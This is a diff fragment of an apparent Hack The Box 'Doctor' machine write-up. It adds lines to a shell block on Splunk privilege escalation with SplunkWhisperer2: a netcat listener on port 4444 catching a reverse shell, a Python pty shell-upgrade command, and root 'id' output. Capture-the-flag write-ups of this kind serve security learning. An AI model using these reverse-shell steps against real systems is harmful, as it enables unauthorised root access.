@@ -209,6 +209,10 @@ On googling splunk privilege escalation, we get the following exploit.
 
 
 ```shell
+┌─[sid@parrot]─[~/Documents/flags/hackthebox/linux-machines/doctor/SplunkWhisperer2/PySplunkWhisperer2]+++++++++++++++++++++++++$
+└──╼ nc -lp 4444
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 root@doctor:/# id
 uid=0(root) gid=0(root) groups=0(root)
 root@doctor:/#
